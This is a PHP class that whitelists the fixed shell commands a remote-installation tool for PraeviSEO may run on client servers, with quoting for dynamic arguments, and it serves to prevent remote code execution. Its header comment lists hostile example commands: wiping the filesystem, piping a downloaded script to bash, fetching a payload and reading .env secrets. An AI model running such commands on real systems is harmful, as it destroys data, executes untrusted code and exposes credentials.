<?php

declare(strict_types=1);

namespace App\RemoteInstallation;

/**
 * Central whitelist for every shell command that PraeviSEO may run on a client server.
 *
 * SECURITY: this class exists to prevent RCE (Remote Code Execution).
 * A remote installation product manipulates SSH / SFTP credentials and touches
 * real client servers. If user input could reach `$ssh->exec($request->command)`
 * or `exec($userInput)`, an attacker could run arbitrary commands such as:
 * - rm -rf /
 * - curl malware.sh | bash
 * - wget payload
 * - cat .env
 *
 * Rules enforced by this layer:
 * - no raw shell command from the frontend or request payload
 * - no free shell concatenation in controllers/services
 * - only predefined, reviewable, testable commands live here
 * - dynamic values must be reduced to safe quoted arguments only
 *
 * The rest of the remote installation backend must treat RemoteCommand as the
 * only allowed way to reach command execution.
 */
final class RemoteCommand
{
    private function __construct(
        public readonly string $label,
        public readonly string $command,
    ) {
    }

    public static function detectPhpVersion(string $projectPath): self
    {
        return new self(
            'detect_php_version',
            self::withinProject($projectPath, 'php -r "echo PHP_VERSION;"'),
        );
    }

    public static function detectComposer(string $projectPath): self
    {
        return new self(
            'detect_composer',
            self::withinProject($projectPath, 'composer --version'),
        );
    }

    public static function detectWriteAccess(string $projectPath): self
    {
        return new self(
            'detect_write_access',
            self::withinProject($projectPath, '[ -w . ] && echo writable || echo not_writable'),
        );
    }

    public static function installLaravelBridge(string $projectPath): self
    {
        return new self(
            'install_laravel_bridge',
            self::withinProject($projectPath, 'composer require praeviseo/laravel-bridge --no-interaction --no-progress'),
        );
    }

    public static function connectLaravel(string $projectPath, string $code): self
    {
        return new self(
            'connect_laravel',
            self::withinProject($projectPath, 'php artisan praeviseo:connect '.self::quote($code)),
        );
    }

    public static function clearLaravelCache(string $projectPath): self
    {
        return new self(
            'clear_laravel_cache',
            self::withinProject($projectPath, 'php artisan optimize:clear'),
        );
    }

    public static function installSymfonyBridge(string $projectPath): self
    {
        return new self(
            'install_symfony_bridge',
            self::withinProject($projectPath, 'composer require praeviseo/symfony-bridge --no-interaction --no-progress --no-scripts'),
        );
    }

    public static function clearSymfonyCache(string $projectPath): self
    {
        return new self(
            'clear_symfony_cache',
            self::withinProject($projectPath, 'php bin/console cache:clear'),
        );
    }

    public static function connectSymfony(string $projectPath, string $code): self
    {
        return new self(
            'connect_symfony',
            self::withinProject($projectPath, 'php bin/console praeviseo:connect '.self::quote($code)),
        );
    }

    private static function withinProject(string $path, string $command): string
    {
        return 'cd '.self::quote($path).' && '.$command;
    }

    private static function quote(string $value): string
    {
        return "'".str_replace("'", "'\"'\"'", $value)."'";
    }
}
